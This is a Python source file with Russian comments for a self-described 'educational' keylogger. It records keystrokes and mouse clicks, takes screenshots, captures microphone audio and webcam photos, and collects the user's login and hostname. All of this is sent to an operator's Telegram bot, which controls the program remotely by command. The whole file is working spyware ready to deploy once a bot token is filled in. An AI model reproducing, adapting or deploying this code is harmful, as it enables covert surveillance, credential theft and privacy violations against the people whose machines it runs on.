import time
import os
import threading
import platform
import socket
import psutil
from datetime import datetime
from pynput import keyboard, mouse
from PIL import ImageGrab
import requests
from io import BytesIO
import telebot
from telebot.types import Message, ReplyKeyboardMarkup, KeyboardButton
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import cv2
from screeninfo import get_monitors

# ========== КОНФИГУРАЦИЯ ==========
TELEGRAM_BOT_TOKEN = "Bot_token" # замените на ваш токен бота. создать через @BotFather
TELEGRAM_CHAT_ID = "Chat_id" # замените на ваш chat_id. узнать через @userinfobot
SCREENSHOT_KEY = keyboard.Key.f8
AUDIO_RECORD_KEY = keyboard.Key.f7
WEBCAM_KEY = keyboard.Key.f6
LOG_FILE = "keylog.txt"
AUDIO_DURATION = 10  # секунд
# ==================================

class AdvancedKeylogger:
    def __init__(self):
        self.log = ""
        self.screenshot_counter = 0
        self.audio_counter = 0
        self.webcam_counter = 0
        self.is_logging = True
        self.is_recording_audio = False
        self.bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
        self.setup_telegram_handlers()
        
        self.create_folders()
        
    def create_folders(self):
        folders = ["screenshots", "audio", "webcam", "logs"]
        for folder in folders:
            if not os.path.exists(folder):
                os.makedirs(folder)
        
    def setup_telegram_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def send_welcome(message: Message):
            markup = self.create_keyboard()
            welcome_text = """
            🤖 Учебный кейлогер активирован! 🤖
            
            Доступные команды:
            /screenshot - сделать скриншот
            /audio - записать аудио (10 сек)
            /webcam - сделать фото с вебкамеры
            /log - получить лог нажатий клавиш
            /sysinfo - получить системную информацию
            /status - статус работы
            /stop_log - остановить логирование
            /start_log - возобновить логирование
            """
            self.bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
            
        @self.bot.message_handler(commands=['screenshot'])
        def send_screenshot(message: Message):
            self.bot.reply_to(message, "📸 Делаю скриншот...")
            self.take_screenshot()
            
        @self.bot.message_handler(commands=['audio'])
        def record_audio(message: Message):
            self.bot.reply_to(message, "🎙️ Записываю аудио (10 секунд)...")
            threading.Thread(target=self.record_and_send_audio).start()
            
        @self.bot.message_handler(commands=['webcam'])
        def take_webcam_photo(message: Message):
            self.bot.reply_to(message, "📷 Делаю фото с вебкамеры...")
            threading.Thread(target=self.capture_webcam).start()
            
        @self.bot.message_handler(commands=['log'])
        def send_log(message: Message):
            self.send_log_file(message.chat.id)
            
        @self.bot.message_handler(commands=['sysinfo'])
        def send_sysinfo(message: Message):
            sysinfo = self.get_system_info()
            self.bot.send_message(message.chat.id, f"🖥️ Системная информация:\n\n{sysinfo}")
            
        @self.bot.message_handler(commands=['status'])
        def send_status(message: Message):
            status = "✅ Логирование активно" if self.is_logging else "❌ Логирование остановлено"
            self.bot.send_message(message.chat.id, f"📊 Статус кейлогера:\n\n{status}")
            
        @self.bot.message_handler(commands=['stop_log'])
        def stop_logging(message: Message):
            self.is_logging = False
            self.bot.send_message(message.chat.id, "⏸️ Логирование остановлено")
            
        @self.bot.message_handler(commands=['start_log'])
        def start_logging(message: Message):
            self.is_logging = True
            self.bot.send_message(message.chat.id, "▶️ Логирование возобновлено")
            
        @self.bot.message_handler(func=lambda message: True)
        def handle_all_messages(message: Message):
            text = message.text.lower()
            if "скриншот" in text:
                self.bot.reply_to(message, "📸 Делаю скриншот...")
                self.take_screenshot()
            elif "аудио" in text or "запись" in text:
                self.bot.reply_to(message, "🎙️ Записываю аудио (10 секунд)...")
                threading.Thread(target=self.record_and_send_audio).start()
            elif "вебкамера" in text or "камера" in text:
                self.bot.reply_to(message, "📷 Делаю фото с вебкамеры...")
                threading.Thread(target=self.capture_webcam).start()
            elif "лог" in text:
                self.send_log_file(message.chat.id)
            elif "система" in text or "инфо" in text:
                sysinfo = self.get_system_info()
                self.bot.send_message(message.chat.id, f"🖥️ Системная информация:\n\n{sysinfo}")
            elif "статус" in text:
                status = "✅ Логирование активно" if self.is_logging else "❌ Логирование остановлено"
                self.bot.send_message(message.chat.id, f"📊 Статус кейлогера:\n\n{status}")
            else:
                self.bot.reply_to(message, "Используйте кнопки или команды для управления")

    def create_keyboard(self):
        markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        btn1 = KeyboardButton('📸 Скриншот')
        btn2 = KeyboardButton('🎙️ Аудио запись')
        btn3 = KeyboardButton('📷 Вебкамера')
        btn4 = KeyboardButton('📄 Лог клавиш')
        btn5 = KeyboardButton('🖥️ Системная информация')
        btn6 = KeyboardButton('📊 Статус')
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        return markup

    def send_to_telegram(self, chat_id, data, is_photo=False, is_audio=False, is_document=False, caption=None):
        try:
            if is_photo:
                self.bot.send_photo(chat_id, data, caption=caption)
            elif is_audio:
                self.bot.send_audio(chat_id, data, caption=caption)
            elif is_document:
                self.bot.send_document(chat_id, data, caption=caption)
            else:
                self.bot.send_message(chat_id, data)
        except Exception as e:
            print(f"Ошибка отправки: {e}")

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshots/screenshot_{timestamp}.png"
            
            screenshot.save(filename, format="PNG")
            
            with open(filename, 'rb') as img:
                self.send_to_telegram(
                    TELEGRAM_CHAT_ID, 
                    img, 
                    is_photo=True, 
                    caption=f"📸 Скриншот #{self.screenshot_counter+1}\n{timestamp}"
                )
            
            self.screenshot_counter += 1
        except Exception as e:
            print(f"Ошибка скриншота: {e}")

    def record_and_send_audio(self):
        try:
            devices = sd.query_devices()
            default_input = sd.default.device[0]
            
            device_info = sd.query_devices(default_input, 'input')
            channels = min(device_info['max_input_channels'], 1)  
            
            fs = 44100  
            recording = sd.rec(int(AUDIO_DURATION * fs), 
                              samplerate=fs, 
                              channels=channels,
                              device=default_input)
            sd.wait() 
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio/audio_{timestamp}.wav"
            write(filename, fs, recording)
            
            with open(filename, 'rb') as audio:
                self.send_to_telegram(
                    TELEGRAM_CHAT_ID, 
                    audio, 
                    is_audio=True, 
                    caption=f"🎙️ Аудиозапись #{self.audio_counter+1}\n{timestamp}"
                )
            
            self.audio_counter += 1
        except Exception as e:
            print(f"Ошибка записи аудио: {e}")
            try:
                fs = 44100
                recording = sd.rec(int(AUDIO_DURATION * fs), samplerate=fs, channels=1)
                sd.wait()
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"audio/audio_{timestamp}.wav"
                write(filename, fs, recording)
                
                with open(filename, 'rb') as audio:
                    self.send_to_telegram(
                        TELEGRAM_CHAT_ID, 
                        audio, 
                        is_audio=True, 
                        caption=f"🎙️ Аудиозапись #{self.audio_counter+1}\n{timestamp}"
                    )
                
                self.audio_counter += 1
            except Exception as e2:
                print(f"Альтернативный метод также не сработал: {e2}")

    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            
            time.sleep(1)
            
            ret, frame = cap.read()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam/webcam_{timestamp}.jpg"
                
                cv2.imwrite(filename, frame)
                
                with open(filename, 'rb') as img:
                    self.send_to_telegram(
                        TELEGRAM_CHAT_ID, 
                        img, 
                        is_photo=True, 
                        caption=f"📷 Вебкамера #{self.webcam_counter+1}\n{timestamp}"
                    )
                
                self.webcam_counter += 1
            else:
                print("Не удалось получить изображение с вебкамеры")
            
            cap.release()
        except Exception as e:
            print(f"Ошибка вебкамеры: {e}")

    def send_log_file(self, chat_id):
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'rb') as f:
                    self.send_to_telegram(
                        chat_id, 
                        f, 
                        is_document=True, 
                        caption="📄 Лог нажатий клавиш"
                    )
            else:
                self.bot.send_message(chat_id, "Файл лога не существует.")
        except Exception as e:
            print(f"Ошибка отправки лога: {e}")

    def get_system_info(self):
        try:
            system_info = f"""
            🖥️ Система: {platform.system()} {platform.release()}
            💻 Процессор: {platform.processor()}
            🐍 Python: {platform.python_version()}
            👤 Пользователь: {os.getlogin()}
            🌐 Хостнейм: {socket.gethostname()}
            📊 Память: {psutil.virtual_memory().percent}% использовано
            💾 Диск: {psutil.disk_usage('/').percent}% использовано
            ⏰ Время работы: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            return system_info
        except Exception as e:
            return f"Ошибка получения системной информации: {e}"

    def save_log(self):
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n\n[{timestamp}]\n{self.log}")
            self.log = ""
        except Exception as e:
            print(f"Ошибка сохранения лога: {e}")

    def on_press(self, key):
        try:
            if key == SCREENSHOT_KEY:
                threading.Thread(target=self.take_screenshot).start()
            elif key == AUDIO_RECORD_KEY:
                threading.Thread(target=self.record_and_send_audio).start()
            elif key == WEBCAM_KEY:
                threading.Thread(target=self.capture_webcam).start()
            
            if self.is_logging:
                if hasattr(key, 'char') and key.char is not None:
                    self.log += key.char
                else:
                    self.log += f" [{key.name}] "
                
                if len(self.log) >= 100:
                    self.save_log()
                    
        except Exception as e:
            print(f"Ошибка обработки клавиши: {e}")

    def on_click(self, x, y, button, pressed):
        if pressed and self.is_logging:
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.log += f" [Мышь: {button} at ({x}, {y}) - {timestamp}] "

    def run_telegram_bot(self):
        print("Запуск Telegram бота...")
        try:
            self.bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Ошибка бота Telegram: {e}")
            time.sleep(10)
            self.run_telegram_bot()

    def start(self):
        bot_thread = threading.Thread(target=self.run_telegram_bot)
        bot_thread.daemon = True
        bot_thread.start()
        
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        keyboard_listener.daemon = True
        keyboard_listener.start()
        
        mouse_listener = mouse.Listener(on_click=self.on_click)
        mouse_listener.daemon = True
        mouse_listener.start()
        
        print("Кейлогер запущен. Используйте клавиши:")
        print("F8 - Скриншот")
        print("F7 - Запись аудио (10 сек)")
        print("F6 - Фото с вебкамеры")
        print("Используйте команды в Telegram для управления")
        
        try:
            while True:
                time.sleep(1)
                if self.log and len(self.log) > 0:
                    self.save_log()
        except KeyboardInterrupt:
            print("Остановка кейлогера...")
            keyboard_listener.stop()
            mouse_listener.stop()

if __name__ == "__main__":
    try:
        import psutil
        import sounddevice
        import scipy
        import cv2
        import screeninfo
    except ImportError as e:
        print(f"Не установлена библиотека: {e}")
        print("Установите её с помощью: pip install psutil sounddevice scipy opencv-python screeninfo")
        exit(1)
    
    logger = AdvancedKeylogger()
    logger.start()
